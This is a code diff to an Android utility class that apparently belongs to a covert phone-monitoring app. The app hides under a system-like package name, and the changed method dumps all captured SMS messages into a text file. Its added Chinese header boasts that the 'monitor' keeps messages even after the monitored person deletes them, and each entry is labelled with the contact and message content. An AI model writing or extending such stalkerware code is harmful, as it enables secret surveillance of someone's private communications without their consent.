@@ -2,6 +2,7 @@ package com.android.system.controled.util;
 
 import java.util.ArrayList;
 
+import com.android.system.controled.Debug;
 import com.android.system.controled.MainApplication;
 import com.android.system.controled.bean.SmsInfo;
 import com.android.system.controled.db.SdcardDbOpera;
@@ -22,16 +23,23 @@ public class SmsToTxtUtil {
 	}
 
 	public synchronized void saveAllSmsToTextFile() {
+		
+		Debug.e("", "saveAllSmsToTextFile");
+		
 		SdcardDbOpera db = SdcardDbOpera.getInstence();
 
 		ArrayList<SmsInfo> smss = db.getAllSms();
 		if (MainApplication.FILE_SMS_TEXT.exists()) {
 			MainApplication.FILE_SMS_TEXT.delete();
 		}
+		
+		StringBuffer sb = new StringBuffer();
+		sb.append("注意：本记录是监听器安装在手机上之后所保存的短信来往记录，即使被监听方收发短信后删除短信，监听器仍会记录下来！\r\n");
+		sb.append("[按时间顺序显示]\r\n\r\n");
 		if (smss != null && smss.size() > 0) {
 			String dateTemp = "";
+			
 			for (SmsInfo sms : smss) {
-				StringBuffer sb = new StringBuffer();
 
 				String date = TimeUtil.longToDateString(sms.getDate());
 
@@ -49,16 +57,17 @@ public class SmsToTxtUtil {
 				sb.append(TimeUtil.longToTime(sms.getDate()));
 
 				if (sms.getName().equals(sms.getAddress())) {
-					sb.append("\r\n").append(sms.getName());
+					sb.append("\r\n对方：").append(sms.getName());
 				} else {
-					sb.append("\r\n").append(sms.getName()).append(" ").append(sms.getAddress());
+					sb.append("\r\n对方：").append(sms.getName()).append(" ").append(sms.getAddress());
 				}
 
-				sb.append("\r\n").append(sms.getBody()).append("\r\n");
-				FileUtil.writeFile(sb.toString(), MainApplication.FILE_SMS_TEXT, true);
+				sb.append("\r\n内容：").append(sms.getBody()).append("\r\n\r\n");
 			}
 		} else {
-			FileUtil.writeFile("暂无短信记录！", MainApplication.FILE_SMS_TEXT, true);
+			sb.append("暂无短信记录！");
 		}
+		
+		FileUtil.writeFile(sb.toString(), MainApplication.FILE_SMS_TEXT, true);
 	}
 }
